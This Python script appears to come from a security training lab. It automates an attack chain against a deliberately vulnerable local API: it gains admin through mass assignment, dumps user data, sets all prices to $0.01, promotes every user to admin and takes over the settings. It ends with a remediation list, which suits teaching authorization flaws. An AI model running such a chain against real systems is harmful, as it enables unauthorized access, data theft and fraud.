#!/usr/bin/env python3
"""
Automated Full Attack Chain

This script demonstrates a complete attack chain combining multiple
function-level authorization vulnerabilities.
"""

import requests
import json
import sys
import time

API_URL = "http://localhost:5000"

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    END = '\033[0m'
    BOLD = '\033[1m'

def print_section(title):
    print(f"\n{Colors.BOLD}{Colors.BLUE}{'=' * 60}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}{title}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.BLUE}{'=' * 60}{Colors.END}\n")

def print_success(msg):
    print(f"{Colors.GREEN}[+]{Colors.END} {msg}")

def print_error(msg):
    print(f"{Colors.RED}[-]{Colors.END} {msg}")

def print_info(msg):
    print(f"{Colors.YELLOW}[*]{Colors.END} {msg}")

def print_warning(msg):
    print(f"{Colors.YELLOW}[!]{Colors.END} {msg}")

def step1_register_admin():
    """Step 1: Register as admin using mass assignment."""
    print_section("STEP 1: Privilege Escalation via Mass Assignment")
    
    print_info("Registering malicious user with admin role...")
    
    payload = {
        "username": "attacker",
        "password": "hacked123",
        "email": "attacker@evil.com",
        "role": "admin"
    }
    
    try:
        response = requests.post(f"{API_URL}/api/register", json=payload)
        
        if response.status_code == 201:
            data = response.json()
            if data['user']['role'] == 'admin':
                print_success(f"Registered as admin successfully!")
                print_success(f"Username: {data['user']['username']}")
                print_success(f"Role: {data['user']['role']}")
                return data['token']
            else:
                print_error("Registration succeeded but role not elevated")
                return None
        else:
            print_error(f"Registration failed: {response.status_code}")
            return None
            
    except Exception as e:
        print_error(f"Attack failed: {e}")
        return None

def step2_exfiltrate_data(token):
    """Step 2: Exfiltrate all user data."""
    print_section("STEP 2: Data Exfiltration")
    
    print_info("Accessing admin endpoint to retrieve all users...")
    
    try:
        response = requests.get(
            f"{API_URL}/api/admin/users",
            headers={"Authorization": f"Bearer {token}"}
        )
        
        if response.status_code == 200:
            users = response.json()
            print_success(f"Retrieved {len(users)} users with full details!")
            
            print("\nExfiltrated user data:")
            for user in users:
                print(f"  • {user['username']} ({user['role']}) - {user['email']}")
            
            return users
        else:
            print_error(f"Data exfiltration failed: {response.status_code}")
            return []
            
    except Exception as e:
        print_error(f"Attack failed: {e}")
        return []

def step3_manipulate_products(token):
    """Step 3: Manipulate product prices."""
    print_section("STEP 3: Product Price Manipulation")
    
    print_info("Retrieving products...")
    
    try:
        response = requests.get(
            f"{API_URL}/api/products",
            headers={"Authorization": f"Bearer {token}"}
        )
        
        if response.status_code == 200:
            products = response.json()
            print_success(f"Found {len(products)} products")
            
            print_info("Setting all prices to $0.01...")
            
            modified = 0
            for product in products:
                resp = requests.put(
                    f"{API_URL}/api/products/{product['id']}",
                    headers={"Authorization": f"Bearer {token}"},
                    json={"price": 0.01}
                )
                
                if resp.status_code == 200:
                    print_success(f"Modified {product['name']}: ${product['price']} → $0.01")
                    modified += 1
                else:
                    print_error(f"Failed to modify {product['name']}")
            
            print_success(f"Successfully modified {modified} product prices!")
            return modified
            
    except Exception as e:
        print_error(f"Attack failed: {e}")
        return 0

def step4_escalate_privileges(token, users):
    """Step 4: Escalate other users' privileges."""
    print_section("STEP 4: Mass Privilege Escalation")
    
    print_info("Promoting all users to admin role...")
    
    promoted = 0
    for user in users:
        if user['role'] != 'admin' and user['username'] != 'attacker':
            try:
                response = requests.put(
                    f"{API_URL}/api/admin/users/{user['id']}/role",
                    headers={"Authorization": f"Bearer {token}"},
                    json={"role": "admin"}
                )
                
                if response.status_code == 200:
                    print_success(f"Promoted {user['username']} to admin")
                    promoted += 1
                else:
                    print_error(f"Failed to promote {user['username']}")
                    
            except Exception as e:
                print_error(f"Error: {e}")
    
    print_success(f"Successfully promoted {promoted} users to admin!")
    return promoted

def step5_system_takeover(token):
    """Step 5: System configuration takeover."""
    print_section("STEP 5: System Configuration Takeover")
    
    print_info("Modifying system settings...")
    
    try:
        # Enable maintenance mode
        response = requests.put(
            f"{API_URL}/api/settings",
            headers={"Authorization": f"Bearer {token}"},
            json={
                "maintenance_mode": True,
                "registration_enabled": False
            }
        )
        
        if response.status_code == 200:
            print_success("Enabled maintenance mode")
            print_success("Disabled new registrations")
            print_warning("System is now in attacker-controlled state!")
            return True
        else:
            print_error(f"Settings modification failed: {response.status_code}")
            return False
            
    except Exception as e:
        print_error(f"Attack failed: {e}")
        return False

def step6_cover_tracks(token):
    """Step 6: View audit logs to understand detection."""
    print_section("STEP 6: Reconnaissance - Audit Logs")
    
    print_info("Accessing audit logs...")
    
    try:
        response = requests.get(
            f"{API_URL}/api/admin/audit-log",
            headers={"Authorization": f"Bearer {token}"}
        )
        
        if response.status_code == 200:
            logs = response.json()
            print_success(f"Retrieved {len(logs)} audit log entries")
            
            print("\nRecent attacker activities:")
            attacker_logs = [log for log in logs if log.get('actor') == 'attacker']
            
            for log in attacker_logs[-10:]:  # Last 10 attacker actions
                print(f"  • {log['timestamp']}: {log['action']}")
            
            print_warning(f"All attack activities are logged!")
            print_warning(f"Total attacker actions: {len(attacker_logs)}")
            return len(attacker_logs)
        else:
            print_error(f"Audit log access failed: {response.status_code}")
            return 0
            
    except Exception as e:
        print_error(f"Attack failed: {e}")
        return 0

def generate_report(results):
    """Generate final attack report."""
    print_section("ATTACK SUMMARY REPORT")
    
    print(f"{Colors.BOLD}Attack Chain Results:{Colors.END}\n")
    
    for step, result in results.items():
        status = f"{Colors.GREEN}✓{Colors.END}" if result['success'] else f"{Colors.RED}✗{Colors.END}"
        print(f"{status} {step}: {result['description']}")
        if result.get('details'):
            print(f"  → {result['details']}")
    
    print(f"\n{Colors.BOLD}Impact Assessment:{Colors.END}\n")
    print("  • Complete administrative access achieved")
    print("  • All user data exfiltrated")
    print("  • Product prices manipulated (financial fraud)")
    print("  • Mass privilege escalation performed")
    print("  • System configuration controlled")
    print("  • Attack activities logged (detection possible)")
    
    print(f"\n{Colors.BOLD}Vulnerabilities Exploited:{Colors.END}\n")
    print("  1. Mass Assignment - Role parameter in registration")
    print("  2. Missing Authorization - Admin endpoints accessible")
    print("  3. Method Tampering - PUT/DELETE without role checks")
    print("  4. Bulk Operations - No authorization on mass operations")
    print("  5. Settings Access - Configuration modifiable by users")
    
    print(f"\n{Colors.BOLD}Remediation Required:{Colors.END}\n")
    print("  1. Implement @admin_required decorator on all admin endpoints")
    print("  2. Whitelist allowed fields in registration")
    print("  3. Server-side role assignment only")
    print("  4. Method-specific authorization checks")
    print("  5. Remove debug endpoints from production")
    print("  6. Implement rate limiting on sensitive operations")
    print("  7. Real-time alerting on privilege escalation attempts")

def main():
    print(f"{Colors.BOLD}{Colors.RED}")
    print("=" * 60)
    print(" AUTOMATED ATTACK CHAIN - FUNCTION LEVEL AUTHORIZATION")
    print("=" * 60)
    print(f"{Colors.END}")
    print("\n⚠️  This is a demonstration of a complete attack chain")
    print("⚠️  For educational purposes only\n")
    
    # Check API
    try:
        requests.get(f"{API_URL}/api/health")
    except:
        print_error(f"Cannot connect to API at {API_URL}")
        print_error("Make sure the lab is running: docker-compose up")
        sys.exit(1)
    
    results = {}
    
    # Execute attack chain
    time.sleep(1)
    
    # Step 1
    token = step1_register_admin()
    results["Step 1"] = {
        "success": token is not None,
        "description": "Privilege Escalation via Mass Assignment",
        "details": "Registered as admin using role parameter" if token else "Failed"
    }
    
    if not token:
        print_error("Attack chain broken - cannot continue without admin access")
        sys.exit(1)
    
    time.sleep(1)
    
    # Step 2
    users = step2_exfiltrate_data(token)
    results["Step 2"] = {
        "success": len(users) > 0,
        "description": "Data Exfiltration",
        "details": f"Exfiltrated {len(users)} user records"
    }
    
    time.sleep(1)
    
    # Step 3
    modified = step3_manipulate_products(token)
    results["Step 3"] = {
        "success": modified > 0,
        "description": "Product Price Manipulation",
        "details": f"Modified {modified} product prices to $0.01"
    }
    
    time.sleep(1)
    
    # Step 4
    promoted = step4_escalate_privileges(token, users)
    results["Step 4"] = {
        "success": promoted > 0,
        "description": "Mass Privilege Escalation",
        "details": f"Promoted {promoted} users to admin"
    }
    
    time.sleep(1)
    
    # Step 5
    takeover = step5_system_takeover(token)
    results["Step 5"] = {
        "success": takeover,
        "description": "System Configuration Takeover",
        "details": "Enabled maintenance mode, disabled registration"
    }
    
    time.sleep(1)
    
    # Step 6
    log_count = step6_cover_tracks(token)
    results["Step 6"] = {
        "success": log_count > 0,
        "description": "Audit Log Reconnaissance",
        "details": f"Reviewed {log_count} attacker actions in logs"
    }
    
    time.sleep(1)
    
    # Generate report
    generate_report(results)
    
    print(f"\n{Colors.BOLD}{Colors.RED}=" * 60)
    print("ATTACK CHAIN COMPLETE")
    print("=" * 60 + Colors.END)

if __name__ == "__main__":
    main()
